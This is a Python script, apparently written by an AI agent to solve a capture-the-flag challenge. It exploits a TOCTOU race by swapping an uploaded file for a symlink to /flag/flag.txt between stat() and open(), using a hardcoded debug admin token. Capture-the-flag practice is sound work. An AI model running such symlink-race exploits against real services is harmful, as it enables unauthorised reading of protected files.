#!/usr/bin/env python3
"""
Author: Claude
Purpose: Exploit TOCTOU with precise timing - race between stat() and open()
Assumptions:
  - stat() checks for regular file
  - We replace with symlink after stat() but before open()
Time created: 2025-11-15 23:15 UTC
Expected result: Win the race and read /flag/flag.txt
Produced result: [To be updated]
"""

import requests
import urllib3
import threading
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "https://exp200-1.pointeroverflowctf.com"
success = False
flag_found = None

def replace_with_symlink(sid, delay=0.001):
    """Replace file with symlink after small delay"""
    time.sleep(delay)

    # Enable symlink mode
    requests.post(
        f"{BASE_URL}/debug/toggle",
        headers={"X-Admin": "devtoken"},
        data={"sid": sid, "mode": "symlink"},
        verify=False,
        timeout=1
    )

    # Upload path to create symlink
    requests.post(
        f"{BASE_URL}/upload",
        data={"sid": sid, "content": "/flag/flag.txt"},
        verify=False,
        timeout=1
    )

def queue_file(sid):
    """Queue the file"""
    try:
        requests.post(
            f"{BASE_URL}/queue",
            data={"sid": sid},
            verify=False,
            timeout=3
        )
    except:
        pass

def attempt_race(delay):
    """Attempt the race with given delay"""
    global success, flag_found

    # Create session
    resp = requests.post(f"{BASE_URL}/session", verify=False)
    sid = resp.json()["sid"]

    # Upload regular file (to pass stat check)
    requests.post(
        f"{BASE_URL}/upload",
        data={"sid": sid, "content": "x" * 100},
        verify=False
    )

    # Start queue
    t1 = threading.Thread(target=queue_file, args=(sid,))
    t1.start()

    # Replace with symlink after delay
    replace_with_symlink(sid, delay)

    t1.join()

    # Check if we got the flag
    resp = requests.get(f"{BASE_URL}/playlist", verify=False)
    lines = resp.text.strip().split('\n')
    if lines[-1].startswith("poctf{") or lines[-1].startswith("flag{"):
        success = True
        flag_found = lines[-1]
        return True

    return False

def main():
    global success, flag_found

    print("[*] Attempting TOCTOU race condition exploit...")
    print("[*] Strategy: Replace regular file with symlink between stat() and open()")

    # Try different delays to find the sweet spot
    delays = [0.0001, 0.0005, 0.001, 0.002, 0.005, 0.01, 0.02, 0.05]

    for i in range(20):  # Multiple attempts
        for delay in delays:
            print(f"\r[*] Attempt {i+1}, delay={delay}s", end='', flush=True)
            if attempt_race(delay):
                print(f"\n\n[!] SUCCESS! FLAG FOUND: {flag_found}")
                return
            if success:
                break
        if success:
            break

    if not success:
        print("\n[!] Race condition not successful. Checking recent playlist entries...")
        resp = requests.get(f"{BASE_URL}/playlist", verify=False)
        lines = resp.text.strip().split('\n')
        print(f"Last 3 entries:")
        for line in lines[-3:]:
            print(f"  {line}")

if __name__ == "__main__":
    main()
